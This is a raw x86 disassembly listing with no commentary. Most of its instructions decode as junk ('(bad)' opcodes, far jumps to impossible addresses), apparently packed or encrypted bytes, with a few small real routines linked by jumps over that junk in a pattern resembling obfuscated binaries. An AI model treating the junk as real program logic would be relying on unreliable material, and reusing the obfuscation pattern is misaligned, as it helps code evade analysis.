  4051a4:	jmp    0xd8ae:0xc26ad63f
  4051ab:	dec    eax
  4051ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051ae:	inc    esi
  4051af:	jecxz  0x405171
  4051b1:	(bad)  
  4051b2:	test   al,0x26
  4051b4:	xor    DWORD PTR [edx+0x7dd5808f],eax
  4051ba:	outs   dx,BYTE PTR ds:[esi]
  4051bb:	inc    esp
  4051bc:	pop    eax
  4051bd:	fcom   QWORD PTR [edi-0x1dc9db07]
  4051c3:	push   0xffffffb3
  4051c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c6:	ins    BYTE PTR es:[edi],dx
  4051c7:	add    DWORD PTR [esi-0x2a],edx
  4051ca:	mov    dl,0xca
  4051cc:	stc    
  4051cd:	les    esi,FWORD PTR [ebx-0xe]
  4051d0:	fsubr  QWORD PTR [edi-0x46]
  4051d3:	mov    bl,0x21
  4051d5:	pop    ds
  4051d6:	push   ebp
  4051d7:	or     dl,0x76
  4051da:	(bad)  
  4051db:	test   eax,0x20a6480f
  4051e0:	dec    esi
  4051e1:	sbb    al,0x9d
  4051e3:	xchg   BYTE PTR [ebx],dh
  4051e5:	pop    esi
  4051e6:	push   esi
  4051e7:	dec    eax
  4051e8:	xor    eax,0xe0da8b6c
  4051ed:	xchg   ecx,eax
  4051ee:	(bad)  
  4051ef:	push   ss
  4051f0:	or     al,0x96
  4051f2:	push   esi
  4051f3:	stc    
  4051f4:	dec    esi
  4051f5:	into   
  4051f6:	sar    al,1
  4051f8:	test   eax,0x621a43be
  4051fd:	pop    ebp
  4051fe:	rcl    ch,1
  405200:	cmp    edi,DWORD PTR [edi+ecx*1]
  405203:	mov    esi,0x67963b08
  405208:	or     DWORD PTR [ecx+eax*1],esi
  40520b:	clc    
  40520c:	xchg   edx,eax
  40520d:	xchg   edi,eax
  40520e:	xchg   esp,eax
  40520f:	sbb    al,0xac
  405211:	scas   al,BYTE PTR es:[edi]
  405212:	lods   al,BYTE PTR ds:[esi]
  405213:	loopne 0x405235
  405215:	mov    al,0xf4
  405217:	push   0xbc7cead0
  40521c:	cmp    ebx,DWORD PTR [eax-0x33]
  40521f:	dec    esi
  405220:	or     eax,0x949b3cc4
  405225:	mov    edi,0x1226a0eb
  40522a:	push   eax
  40522b:	out    dx,eax
  40522c:	test   DWORD PTR [eax+0x44],ebx
  40522f:	out    dx,eax
  405230:	call   0xa2448292
  405235:	inc    esp
  405236:	add    ch,ah
  405238:	retf   0x601c
  40523b:	mov    DWORD PTR [ebp+0xc],eax
  40523e:	mov    eax,DWORD PTR [ebp-0x4]
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0x34c69339
  40528d:	sbb    DWORD PTR [ebx+0x2a],ebx
  405290:	jle    0x405310
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x4052e4
  405297:	out    0x2e,eax
  405299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40529a:	ja     0x405275
  40529c:	mov    edx,0x586de2dc
  4052a1:	inc    edi
  4052a2:	cdq    
  4052a3:	sub    edx,0xffffffe6
  4052a6:	ja     0x4052dd
  4052a8:	(bad)  
  4052a9:	pop    edi
  4052aa:	mov    esi,fs
  4052ac:	test   al,0xbc
  4052ae:	pop    esi
  4052af:	pushf  
  4052b0:	ret    
  4052b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052b2:	add    al,0xbd
  4052b4:	rol    DWORD PTR [ebp+0x7],cl
  4052b7:	xor    DWORD PTR [edi+0x7d3bc038],ebx
  4052bd:	xchg   ecx,eax
  4052be:	jecxz  0x405275
  4052c0:	cld    
  4052c1:	repnz mov eax,es:0xbbc624e9
  4052c8:	loopne 0x405265
  4052ca:	add    DWORD PTR [ecx+eax*4],0xffffffe9
  4052ce:	mov    ebp,0x86b0b4b
  4052d3:	and    ecx,esi
  4052d5:	(bad)  
  4052d6:	das    
  4052d7:	(bad)  
  4052d8:	enter  0x9ea,0xbc
  4052dc:	push   esi
  4052dd:	je     0x4052dd
  4052df:	pusha  
  4052e0:	jo     0x4052fb
  4052e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052e4:	and    eax,0x28d01043
  4052e9:	push   ecx
  4052ea:	sbb    dl,0x23
  4052ed:	inc    edi
  4052ee:	pop    ss
  4052ef:	adc    eax,DWORD PTR [ecx-0x484a4c04]
  4052f5:	call   0xdb867a8d
  4052fa:	push   esp
  4052fb:	pop    ds
  4052fc:	lds    esi,FWORD PTR [ebp+ebx*1-0x5bb8be2d]
  405303:	neg    DWORD PTR [ecx-0x55]
  405306:	mov    edx,0xae06fa9b
  40530b:	and    eax,0x29c4046d
  405310:	jno    0x40538b
  405312:	pop    ecx
  405313:	gs pop es
  405315:	inc    ebp
  405316:	pop    edx
  405317:	les    ebp,FWORD PTR [edi-0x1c]
  40531a:	in     al,dx
  40531b:	hlt    
  40531c:	jns    0x405393
  40531e:	push   DWORD PTR [ecx-0x7d]
  405321:	arpl   cx,bp
  405323:	hlt    
  405324:	push   ss
  405325:	gs inc edi
  405327:	nop
  405328:	ins    DWORD PTR es:[edi],dx
  405329:	(bad)  
  40532a:	mov    ebx,0x7d27648a
  40532f:	repnz mov bl,0xc7
  405332:	jb     0x40536e
  405334:	movntps XMMWORD PTR [eax-0x1c904095],xmm6
  40533b:	cld    
  40533c:	dec    eax
  40533d:	js     0x4052cd
  40533f:	dec    ecx
  405340:	int    0x20
  405342:	sub    edx,esi
  405344:	jns    0x40538b
  405346:	out    dx,al
  405347:	jno    0x405370
  405349:	jns    0x405307
  40534b:	sub    bl,bh
  40534d:	xchg   esi,eax
  40534e:	jl     0x405376
  405350:	add    BYTE PTR [ebx*4+0x49898a43],bl
  405357:	(bad)  
  405358:	mov    eax,0xb95da6a2
  40535d:	scas   eax,DWORD PTR es:[edi]
  40535e:	jp     0x405385
  405360:	(bad)  
  405361:	fild   DWORD PTR [edx-0x7dc420ca]
  405367:	rol    DWORD PTR [eax-0x47622aec],1
  40536d:	stos   BYTE PTR es:[edi],al
  40536e:	and    al,0x67
  405370:	xchg   edx,eax
  405371:	adc    BYTE PTR [edx+esi*8-0x4b],ah
  405375:	nop
  405376:	mov    edi,DWORD PTR [edi]
  405378:	in     al,0xc6
  40537a:	scas   al,BYTE PTR es:[edi]
  40537b:	int3   
  40537c:	sub    al,0x34
  40537e:	into   
  40537f:	shl    BYTE PTR [edi-0x53],1
  405382:	sti    
  405383:	stc    
  405384:	(bad)  
  405385:	cmp    esi,DWORD PTR [edx-0x58]
  405388:	lods   eax,DWORD PTR ds:[esi]
  405389:	sahf   
  40538a:	xor    dh,bh
  40538c:	sti    
  40538d:	add    ah,bl
  40538f:	dec    ecx
  405390:	shr    bh,cl
  405392:	rcr    BYTE PTR ds:0x82e01f2a,0x80
  405399:	jnp    0x40532f
  40539b:	xchg   esp,eax
  40539c:	mov    ecx,0xc63b9d10
  4053a1:	ret    0x3f99
  4053a4:	das    
  4053a5:	adc    dl,BYTE PTR [eax-0x8]
  4053a8:	rcr    edx,cl
  4053aa:	add    DWORD PTR [edx+0x26],ebx
  4053ad:	pop    ds
  4053ae:	fidivr DWORD PTR [eax-0x1b]
  4053b1:	test   esp,ebp
  4053b3:	mov    cl,0x93
  4053b5:	in     al,dx
  4053b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053b7:	int3   
  4053b8:	shl    BYTE PTR [ebp+0x44],0x94
  4053bc:	push   esi
  4053bd:	pop    esi
  4053be:	lock mov esi,0x744482ae
  4053c4:	in     eax,dx
  4053c5:	push   ss
  4053c6:	sti    
  4053c7:	(bad)  
  4053c9:	xlat   BYTE PTR ds:[ebx]
  4053ca:	fcom   DWORD PTR [ecx-0x6c]
  4053cd:	sbb    bl,dh
  4053cf:	(bad)  [edi-0x79306acf]
  4053d5:	adc    al,0xa1
  4053d7:	outs   dx,DWORD PTR ds:[esi]
  4053d8:	mov    DWORD PTR [esi-0x39],edi
  4053db:	mov    ebx,0x2f3abbfa
  4053e0:	push   0x52a9faea
  4053e5:	mov    ah,0x25
  4053e7:	pop    esp
  4053e8:	dec    ebp
  4053e9:	ins    DWORD PTR es:[edi],dx
  4053ea:	sti    
  4053eb:	ror    ah,0x2a
  4053ee:	jle    0x4053e5
  4053f0:	dec    edx
  4053f1:	cmp    DWORD PTR [ebp-0x28ed6956],esi
  4053f7:	fild   QWORD PTR [eax]
  4053f9:	inc    ecx
  4053fa:	xchg   esp,eax
  4053fb:	cmp    DWORD PTR [edi+edi*4],ebp
  4053fe:	in     al,0x60
  405400:	iret   
  405401:	pop    esp
  405402:	cmp    eax,DWORD PTR [edi+0x46436003]
  405408:	dec    eax
  405409:	mov    eax,ds:0xf2e2e09f
  40540e:	sub    BYTE PTR [edx+0x5f517f5d],al
  405414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405415:	jb     0x405486
  405417:	retf   
  405418:	aas    
  405419:	pop    edx
  40541a:	adc    ebx,DWORD PTR [esp+esi*8]
  40541d:	jne    0x405403
  40541f:	mov    dl,0x8e
  405421:	push   es
  405422:	inc    esi
  405423:	adc    esp,DWORD PTR [eax]
  405425:	rsm    
  405427:	fcomp  DWORD PTR [eax-0x2c]
  40542a:	std    
  40542b:	mov    cl,0x53
  40542d:	test   bl,bl
  40542f:	ds aas 
  405431:	in     eax,0xb1
  405433:	hlt    
  405434:	mov    esi,0x769b5911
  405439:	scas   eax,DWORD PTR es:[edi]
  40543a:	jp     0x405403
  40543c:	dec    ecx
  40543d:	xor    al,0xb7
  40543f:	leave  
  405440:	inc    esp
  405441:	pop    es
  405442:	sub    al,0x4a
  405444:	imul   ebx,DWORD PTR [ebp-0x5],0xffffffa3
  405448:	es out 0x29,eax
  40544b:	inc    edi
  40544c:	inc    ebp
  40544d:	jp     0x405433
  40544f:	push   ecx
  405450:	adc    eax,0x3ee12b03
  405455:	std    
  405456:	pop    edx
  405457:	cmp    DWORD PTR [esi-0x4bcc2b0e],0xffffffd7
  40545e:	call   0xd166:0x51daf305
  405465:	push   es
  405466:	add    ecx,DWORD PTR [ebp+0x6e]
  405469:	add    esi,DWORD PTR [ebp+0x73]
  40546c:	inc    ecx
  40546d:	add    BYTE PTR [ecx-0x2d6269e7],dh
  405473:	xchg   BYTE PTR [edi+0x387d994a],ah
  405479:	data16 stos BYTE PTR es:[edi],al
  40547b:	not    bh
  40547d:	add    cl,BYTE PTR [esi]
  40547f:	sub    BYTE PTR [esi+eiz*8-0x67],dh
  405483:	adc    esp,DWORD PTR [ecx+edi*4-0x5b9444b7]
  40548a:	arpl   WORD PTR [ecx],bp
  40548c:	daa    
  40548d:	mov    ecx,0xcf062be
  405492:	div    bh
  405494:	dec    eax
  405495:	pop    ebx
  405496:	xchg   ebp,eax
  405497:	sbb    DWORD PTR [esi-0x14],ebp
  40549a:	scas   eax,DWORD PTR es:[edi]
  40549b:	mov    ebx,0x83915c89
  4054a0:	(bad)  
  4054a1:	xor    al,0x37
  4054a3:	test   bh,0x5c
  4054a6:	mov    ebx,0x7f02ea11
  4054ab:	nop
  4054ac:	mov    eax,ds:0xd48c1af3
  4054b1:	inc    ebp
  4054b2:	dec    ebp
  4054b3:	xchg   edi,eax
  4054b4:	cdq    
  4054b5:	in     eax,0xc9
  4054b7:	mov    edx,0x72cf2bad
  4054bc:	daa    
  4054bd:	push   cs
  4054be:	mov    fs,WORD PTR [eax-0x22]
  4054c1:	lods   eax,DWORD PTR ds:[esi]
  4054c2:	mov    edx,0x5143eeb7
  4054c7:	mov    bh,0xa7
  4054c9:	jns    0x4054b6
  4054cb:	cld    
  4054cc:	fisubr WORD PTR [esi]
  4054ce:	sbb    al,0xf6
  4054d0:	lea    esi,[edi+eiz*4]
  4054d3:	aaa    
  4054d4:	xor    bl,bl
  4054d6:	fnstenv [edi-0x7d719a6c]
  4054dc:	jl     0x4054b7
  4054de:	into   
  4054df:	push   ecx
  4054e0:	sbb    esi,esp
  4054e2:	jmp    0x9d1b:0x96ed0b67
  4054e9:	cs add cl,bh
  4054ec:	or     eax,0x6a089e77
  4054f1:	adc    ah,al
  4054f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054f4:	adc    eax,DWORD PTR ss:[ebx]
  4054f7:	push   ebx
  4054f8:	int3   
  4054f9:	iret   
  4054fa:	shl    BYTE PTR ds:0x697a50aa,cl
  405500:	xchg   esp,eax
  405501:	add    dh,bh
  405503:	or     bl,0x69
  405506:	sbb    al,0x11
  405508:	jecxz  0x40552d
  40550a:	inc    ebp
  40550b:	fsubr  QWORD PTR [ecx]
  40550d:	sub    eax,DWORD PTR [ebp+0x29a3a65f]
  405513:	sar    DWORD PTR [eax],1
  405515:	icebp  
  405516:	call   0x5219:0xa66ea781
  40551d:	inc    ebp
  40551e:	inc    edx
  40551f:	int3   
  405520:	pop    ecx
  405521:	ret    
  405522:	retf   0x5d31
  405525:	dec    ebx
  405526:	test   BYTE PTR [eax-0x2e],dh
  405529:	cdq    
  40552a:	sub    esp,0xffffff8f
  40552d:	loop   0x4054c5
  40552f:	inc    ebx
  405530:	push   edi
  405531:	sbb    al,0xe3
  405533:	nop
  405534:	mov    edi,0xac8110
  405539:	hlt    
  40553a:	xchg   ebp,eax
  40553b:	lods   eax,DWORD PTR ds:[esi]
  40553c:	adc    ecx,DWORD PTR [bx+di-0x28]
  405540:	movd   DWORD PTR [esi+0x177adc9e],mm2
  405547:	fs dec esp
  405549:	ficomp DWORD PTR [esi-0x4c]
  40554c:	add    al,0xa5
  40554e:	pop    ebx
  40554f:	out    dx,eax
  405550:	mov    ebx,DWORD PTR [ebp-0x194072c4]
  405556:	pop    fs
  405558:	sub    esp,esi
  40555a:	mov    ah,0x5e
  40555c:	das    
  40555d:	jge    0x405539
  40555f:	out    dx,al
  405560:	into   
  405561:	mov    bh,0x22
  405563:	ins    BYTE PTR es:[edi],dx
  405564:	or     ecx,DWORD PTR [esi+0x62d03c70]
  40556a:	sahf   
  40556b:	xor    DWORD PTR [eax-0x447e1e74],edx
  405571:	dec    ecx
  405572:	sub    al,0xed
  405574:	lods   eax,DWORD PTR ds:[esi]
  405575:	dec    eax
  405576:	push   ds
  405577:	mov    esp,0x7342a26c
  40557c:	pusha  
  40557d:	and    ecx,esp
  40557f:	cs dec eax
  405581:	and    BYTE PTR [eax+0x403b5851],al
  405587:	mov    cl,0xc6
  405589:	add    DWORD PTR [ebx],esp
  40558b:	inc    ebx
  40558c:	sbb    al,0x1f
  40558e:	les    ebp,FWORD PTR [eax-0x36]
  405591:	pop    ecx
  405592:	mov    esi,0x7252e18d
  405597:	jle    0x40559e
  405599:	(bad)  
  40559b:	mov    ds:0x8f012b26,eax
  4055a0:	ins    DWORD PTR es:[edi],dx
  4055a1:	ss jne 0x4055d1
  4055a4:	push   edx
  4055a5:	std    
  4055a6:	(bad)  [eax+0x34414335]
  4055ac:	jnp    0x4055de
  4055ae:	out    0x22,al
  4055b0:	and    eax,0x4664e3e5
  4055b5:	dec    edi
  4055b6:	and    BYTE PTR [ecx-0x25],dh
  4055b9:	xchg   ebx,eax
  4055ba:	leave  
  4055bb:	mov    WORD PTR [eax],ds
  4055bd:	sbb    BYTE PTR [ecx],cl
  4055bf:	jmp    0x40554f
  4055c1:	lods   al,BYTE PTR ds:[esi]
  4055c2:	sub    DWORD PTR [eax-0x233cd3d3],0xa
  4055c9:	xchg   ecx,esp
  4055cb:	sub    bl,BYTE PTR ds:0x892bbf38
  4055d1:	pop    ss
  4055d2:	cmp    DWORD PTR [ecx+0x6ccd721e],ebx
  4055d8:	(bad)  
  4055d9:	fmul   DWORD PTR [ecx-0x6047ae7c]
  4055df:	cld    
  4055e0:	mov    ds:0xfc458905,eax
  4055e5:	mov    DWORD PTR ds:0x4344f3,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	cs (bad) 
  405604:	out    0x2f,al
  405606:	dec    edx
  405607:	and    DWORD PTR [esi],esi
  405609:	jle    0x405689
  40560b:	les    edi,FWORD PTR [ecx+0x7e]
  40560e:	jle    0x405645
  405610:	lahf   
  405611:	div    BYTE PTR [eax-0x3d]
  405614:	cs push esi
  405616:	cmp    eax,0x5e6a89f5
  40561b:	repz xlat BYTE PTR ds:[ebx]
  40561d:	mov    bh,0xac
  40561f:	adc    ah,BYTE PTR [esi+ecx*8+0xe]
  405623:	mov    ds:0xc994f9fe,al
  405628:	sbb    al,0x18
  40562a:	cli    
  40562b:	scas   al,BYTE PTR es:[edi]
  40562c:	jo     0x40569c
  40562e:	ins    BYTE PTR es:[edi],dx
  40562f:	or     BYTE PTR [esi-0x515e42d0],ch
  405635:	jmp    0xd014e3fc
  40563a:	ror    DWORD PTR [esi-0x48],1
  40563d:	sub    eax,0xdbc66857
  405642:	jmp    0x405675
  405644:	outs   dx,BYTE PTR ds:[esi]
  405645:	imul   esp,DWORD PTR [ecx],0x7a
  405648:	sub    eax,esi
  40564a:	loope  0x405642
  40564c:	std    
  40564d:	shl    DWORD PTR [ebx],0xe2
  405650:	ret    
  405651:	hlt    
  405652:	mov    ebp,0xd4aec87b
  405657:	xchg   ebp,eax
  405658:	(bad)  
  405659:	or     DWORD PTR ds:0xfc76add,ecx
  40565f:	fs out dx,al
  405661:	and    eax,0xb41fff44
  405666:	mov    esp,0x2ad15673
  40566b:	mov    fs:0x90b5288b,eax
  405671:	xchg   ebx,eax
  405672:	out    dx,eax
  405673:	dec    edi
  405674:	pop    es
  405675:	cs out 0x91,eax
  405678:	enter  0x45cb,0x95
  40567c:	push   ebx
  40567d:	loopne 0x4056f9
  40567f:	les    esi,FWORD PTR [edi+0x4994c03c]
  405685:	xchg   esi,eax
  405686:	cvtps2pi mm3,QWORD PTR [eax+0x2d40da1]
  40568d:	lea    edi,[ecx-0x2c]
  405690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405691:	xchg   edi,eax
  405692:	call   0xbbf7:0xa143e2e8
  405699:	xor    DWORD PTR [eax-0x205804a6],eax
  40569f:	gs sbb eax,0x65c7c44f
  4056a5:	lods   al,BYTE PTR ds:[esi]
  4056a6:	ror    BYTE PTR gs:[edx-0x40548d90],0x24
  4056ae:	sbb    edx,DWORD PTR [eax+eiz*4]
  4056b1:	mov    ah,0x7b
  4056b3:	ror    BYTE PTR [eax-0x54],0xf5
  4056b7:	aam    0x4d
  4056b9:	add    esi,DWORD PTR [esp+esi*8]
  4056bc:	mov    esp,0x93c5193
  4056c1:	xlat   BYTE PTR ds:[ebx]
  4056c2:	test   ebp,0x5f8106fb
  4056c8:	xor    al,0xee
  4056ca:	fwait
  4056cb:	cmp    esp,DWORD PTR [ecx]
  4056cd:	adc    al,0xe
  4056cf:	jge    0x40565d
  4056d1:	and    al,0x5a
  4056d3:	jg     0x405749
  4056d5:	mov    ah,0xfa
  4056d7:	mov    bl,0xc6
  4056d9:	das    
  4056da:	sbb    esp,DWORD PTR [ebx+0x27]
  4056dd:	jb     0x40566a
  4056df:	adc    BYTE PTR [ecx],bh
  4056e1:	pop    ebx
  4056e2:	or     DWORD PTR [edi],ebx
  4056e4:	ret    
  4056e5:	dec    esp
  4056e6:	pop    ss
  4056e7:	push   edi
  4056e8:	mov    al,ds:0x50329fad
  4056ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056ee:	add    BYTE PTR [ebx],dh
  4056f0:	xlat   BYTE PTR ds:[ebx]
  4056f1:	repnz fisubr WORD PTR [edx+0x718bee27]
  4056f8:	jmp    0x2f54:0x196a21b8
  4056ff:	cld    
  405700:	cmc    
  405701:	ds jne 0x40570c
  405704:	mov    eax,0x8c513c91
  405709:	and    al,0x6e
  40570b:	cli    
  40570c:	fcomp  QWORD PTR [edi+0x46]
  40570f:	add    DWORD PTR [esi],ebx
  405711:	stos   DWORD PTR es:[edi],eax
  405712:	call   0xe1b1:0x22ff4d59
  405719:	sar    DWORD PTR [edi+0x67],0x49
  40571d:	call   0xc08c:0x58f0d058
  405724:	xor    DWORD PTR [ebp+eax*2+0x2f],esp
  405728:	sub    BYTE PTR cs:[ecx+0x7a],al
  40572c:	hlt    
  40572d:	aas    
  40572e:	inc    esi
  40572f:	das    
  405730:	and    DWORD PTR [esi+0x74],edi
  405733:	out    dx,al
  405734:	mov    BYTE PTR ds:0x3a2ff291,ah
  40573a:	sbb    eax,DWORD PTR [edx-0x21]
  40573d:	xchg   esp,eax
  40573e:	sub    ebp,DWORD PTR [ebx+eax*4+0x1c2070a7]
  405745:	or     ecx,DWORD PTR [eax-0x5bcc3b38]
  40574b:	push   0x9f38d403
  405750:	mov    esi,0x988e9a6a
  405755:	mov    DWORD PTR [edi-0x48],edi
  405758:	gs pop edx
  40575a:	push   DWORD PTR [edx+0x24b92e7]
  405760:	adc    al,0x2c
  405762:	std    
  405763:	jne    0x405797
  405765:	mov    al,0x73
  405767:	fstp   TBYTE PTR [ebx-0x426d48b9]
  40576d:	sbb    eax,0x187f9c0a
  405772:	test   al,0xff
  405774:	in     eax,dx
  405775:	ins    DWORD PTR es:[edi],dx
  405776:	fs inc ebp
  405778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405779:	(bad)  [ecx-0x39]
  40577c:	inc    edi
  40577d:	and    BYTE PTR [ebp+0x7de627e],bl
  405783:	mov    dl,0x25
  405785:	xchg   edi,eax
  405786:	ficom  WORD PTR [edx+0x3e]
  405789:	xchg   ebp,eax
  40578a:	je     0x40573a
  40578c:	sub    eax,0xa12aefbe
  405791:	xor    al,0x72
  405793:	add    al,0xae
  405795:	daa    
  405796:	and    BYTE PTR [esi],dl
  405798:	dec    ebx
  405799:	enter  0xd501,0xc
  40579d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40579e:	dec    eax
  40579f:	xor    dh,al
  4057a1:	mov    WORD PTR [ebx+0x4a457049],fs
  4057a7:	pop    eax
  4057a8:	test   BYTE PTR [esp+edi*8],cl
  4057ab:	mov    edx,0xc9852d60
  4057b0:	cmp    DWORD PTR [ecx-0x5c],esi
  4057b3:	cs (bad) 
  4057b5:	cmp    al,0xe
  4057b7:	ffreep st(7)
  4057b9:	(bad)  
  4057ba:	ja     0x405776
  4057bc:	inc    ebx
  4057bd:	data16 jecxz 0x4057d8
  4057c0:	out    dx,al
  4057c1:	je     0x4057fa
  4057c3:	sbb    DWORD PTR [edx],ebx
  4057c5:	jl     0x405806
  4057c7:	jmp    0x40580f
  4057c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ca:	pop    esp
  4057cb:	repnz arpl si,di
  4057ce:	and    esp,DWORD PTR [eax]
  4057d0:	int3   
  4057d1:	sahf   
  4057d2:	fmul   st(7),st
  4057d4:	dec    BYTE PTR [ecx]
  4057d6:	dec    esp
  4057d7:	loop   0x405834
  4057d9:	in     al,dx
  4057da:	sub    al,BYTE PTR [edi-0x78541697]
  4057e0:	sahf   
  4057e1:	xor    eax,0x58344744
  4057e6:	mov    es,WORD PTR [ebp-0x27305174]
  4057ec:	fnstcw WORD PTR [esi]
  4057ee:	jnp    0x4057be
  4057f0:	mov    dh,bh
  4057f2:	loope  0x4057ca
  4057f4:	idiv   DWORD PTR [ebx+0x4fca745e]
  4057fa:	mov    esi,0x352de739
  4057ff:	xchg   ebx,eax
  405800:	xchg   esi,eax
  405801:	scas   al,BYTE PTR es:[edi]
  405802:	sbb    eax,0xd8782acc
  405807:	push   cs
  405808:	jo     0x405810
  40580a:	sbb    edi,esp
  40580c:	adc    dh,BYTE PTR [ebx-0x4b]
  40580f:	mov    edi,0x67dd0d1f
  405814:	retf   
  405815:	jae    0x40580e
  405817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405818:	js     0x4057df
  40581a:	fist   WORD PTR [esi]
  40581c:	lahf   
  40581d:	test   eax,0xe55742e9
  405822:	fbstp  TBYTE PTR [ebx-0x6bfafdac]
  405828:	or     al,0x88
  40582a:	jmp    0x40583d
  40582c:	arpl   WORD PTR [ebx-0x7318fe69],ax
  405832:	inc    esp
  405833:	jge    0x40585f
  405835:	xchg   esp,eax
  405836:	dec    eax
  405837:	fs adc esp,esp
  40583a:	sahf   
  40583b:	xor    eax,0x41e18fdc
  405840:	add    DWORD PTR [eax],ebx
  405842:	(bad)  
  405843:	and    ecx,DWORD PTR [ecx-0x63633ff4]
  405849:	cli    
  40584a:	sbb    eax,0xd14f59fe
  40584f:	pop    edx
  405850:	test   al,0x38
  405852:	jmp    0x87b4:0x41bf0fd
  405859:	xchg   ebx,eax
  40585a:	adc    eax,0xc293be9
  40585f:	push   ss
  405860:	push   ecx
  405861:	gs inc edi
  405863:	in     eax,dx
  405864:	add    bl,bh
  405866:	xchg   ebp,eax
  405867:	(bad)  
  405868:	push   eax
  405869:	or     DWORD PTR [ecx],edi
  40586b:	pop    ds
  40586c:	ds mov esp,0xa7673513
  405872:	pop    esp
  405873:	or     BYTE PTR [ecx+0x29],0x5f
  405877:	int    0x6b
  405879:	xor    eax,0x77581c0b
  40587e:	test   DWORD PTR [esp+eax*1-0x11],ebp
  405882:	mov    edx,0x428cd7ad
  405887:	xor    eax,0x1403f715
  40588c:	mov    dl,0x7a
  40588e:	push   edx
  40588f:	or     eax,0x777e8638
  405894:	fstp   TBYTE PTR [eax-0x68]
  405897:	fwait
  405898:	lea    edi,[ecx-0x1d5e1cb]
  40589e:	in     al,0x55
  4058a0:	add    eax,0xbfc3a409
  4058a5:	inc    ebx
  4058a6:	loope  0x40584b
  4058a8:	daa    
  4058a9:	dec    ebx
  4058aa:	imul   ebp,edi,0xffffffc0
  4058ad:	out    dx,al
  4058ae:	or     esi,DWORD PTR [eax+0x12]
  4058b1:	push   es
  4058b2:	and    BYTE PTR [ebp+0x79ff7870],dh
  4058b8:	jge    0x40584e
  4058ba:	jmp    0x4058c6
  4058bc:	xor    al,0xc8
  4058be:	js     0x405895
  4058c0:	add    eax,0x7b7b48af
  4058c5:	loop   0x40585e
  4058c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058c8:	repz mov edi,DWORD PTR [edx+0x66]
  4058cc:	xchg   edx,eax
  4058cd:	mul    BYTE PTR [edi+0xf2324ec]
  4058d3:	cmp    eax,0x2b913ad2
  4058d8:	mov    edi,cs
  4058da:	pop    ss
  4058db:	xor    al,0x26
  4058dd:	add    eax,0x239dbc9d
  4058e2:	test   DWORD PTR [edi-0x23fefb55],0x1f252842
  4058ec:	adc    al,0xee
  4058ee:	into   
  4058ef:	call   0x8985:0xf765469e
  4058f6:	jle    0x405905
  4058f8:	scas   eax,DWORD PTR es:[edi]
  4058f9:	mov    cs,edx
  4058fb:	dec    esi
  4058fc:	les    ebp,FWORD PTR [eax+0x64]
  4058ff:	or     al,0x76
  405901:	popa   
  405902:	mov    cl,0xda
  405904:	cld    
  405905:	popa   
  405906:	xchg   BYTE PTR [eax],dh
  405908:	inc    edx
  405909:	push   0xffffff8f
  40590b:	push   0xc0cdcb7a
  405910:	sub    ch,BYTE PTR [edi+0x3f4732bd]
  405916:	xor    DWORD PTR [ecx+0x58],0x48f43317
  40591d:	or     eax,0xeef9d3cc
  405922:	xor    cl,dl
  405924:	leave  
  405925:	call   0xe9a82207
  40592a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40592b:	jbe    0x4058fb
  40592d:	pmovmskb ecx,mm7
  405930:	std    
  405931:	lds    edi,FWORD PTR [esi]
  405933:	cmp    BYTE PTR [ebx],cl
  405935:	das    
  405936:	mov    dh,0x13
  405938:	inc    ecx
  405939:	push   cs
  40593a:	mov    bl,0xef
  40593c:	call   0xf9dc18ca
  405941:	outs   dx,BYTE PTR ds:[esi]
  405942:	mov    ds:0xeb3a54b3,eax
  405947:	sti    
  405948:	ds push 0xfffffffc
  40594b:	shl    BYTE PTR [ecx+0xc8b81d8],cl
  405951:	lock and bh,ah
  405954:	dec    ebx
  405955:	mov    DWORD PTR [ebp-0x8],0x4f39
  40595c:	mov    DWORD PTR ds:0x4345d3,0x224a
  405966:	jmp    0x405cc9
  40596b:	mov    edx,0x71b8a1ab
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	push   cs
  405978:	fbld   TBYTE PTR [ecx+0x7e31ef97]
  40597e:	jle    0x405944
  405980:	jns    0x405a00
  405982:	jle    0x4059cb
  405984:	test   al,0xd6
  405986:	repnz or DWORD PTR [esi-0x65d70dbb],ebp
